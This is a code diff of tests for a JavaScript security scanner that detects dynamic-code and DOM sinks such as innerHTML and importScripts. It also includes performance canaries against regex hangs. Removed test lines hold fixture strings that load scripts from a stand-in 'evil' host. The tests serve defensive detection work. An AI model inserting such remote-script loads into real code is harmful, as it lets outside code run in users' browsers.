+    expect(stripped).not.toContain('drop');
+  });
+});
+
+describe('scanSourceForSinks (textual DOM patterns)', () => {
+  const DOM = [{ pattern: /\.innerHTML\s*=/, label: 'innerHTML' }];
+
+  it('matches over the whole text and reports the line', () => {
+    const code = ['const a = 1;', 'el.innerHTML = html;'].join('\n');
+    expect(scanSourceForSinks(code, DOM)).toEqual([{ label: 'innerHTML', line: 2 }]);
   });
 
-  it('keeps a real call that follows a comment on the same line', () => {
-    const code = stripComments('run(); // trailing note\nconst f = Function("x");');
-    expect(hits(SOURCE_CODE_SINKS, code)).toBe(true);
+  it('does not match inside a comment', () => {
+    expect(scanSourceForSinks('// el.innerHTML = x\n', DOM)).toEqual([]);
   });
+});
 
-  it('preserves absolute and protocol-relative URLs inside string literals', () => {
-    // The importScripts gates must still SEE these after comment stripping.
-    expect(stripComments('importScripts("https://evil/x.js");')).toContain('https://evil/x.js');
-    expect(stripComments('importScripts("//evil/x.js");')).toContain('//evil/x.js');
-  });
-
-  it('blanks a block comment to WHITESPACE so identifiers cannot fuse', () => {
-    // Length is preserved (offsets stay valid), and the tokens either side stay
-    // separate — `ab` would be a new identifier the scan never saw in the source.
-    const stripped = stripComments('a/* joiner */b');
-    expect(stripped).toHaveLength('a/* joiner */b'.length);
-    expect(stripped).toMatch(/^a\s+b$/);
-    expect(stripped).not.toContain('ab');
+describe('linearity (performance canary)', () => {
+  // The regex family this replaced once shipped a nested quantifier that took
+  // `lint:security` from ~2s to unbounded (killed at 9+ minutes at 100% CPU).
+  // The analyzer is a linear scan, but these keep any future regression in the
+  // remaining textual patterns from reaching CI as a hang.
+  it.each([
+    ['deep indentation before a non-match', `${' '.repeat(5000)}notASink(x);`],
+    ['a long comment run', `${'// filler\n'.repeat(2000)}const a = 1;`],
+    // `'$' + '{a}'` rather than a literal `${a}`: the fixture needs the
+    // characters, and writing them in a plain string would read as an
+    // interpolation this file never intends to perform.
+    ['a long template with interpolations', `\`${`${'$'}{a}`.repeat(2000)}\``],
+    ['a long unterminated block comment', `/*${'x'.repeat(20000)}`],
+  ])('completes in bounded time: %s', (_label, code) => {
+    const started = Date.now();
+    findDynamicCodeSinks(code);
+    expect(Date.now() - started).toBeLessThan(2000);
   });
 });
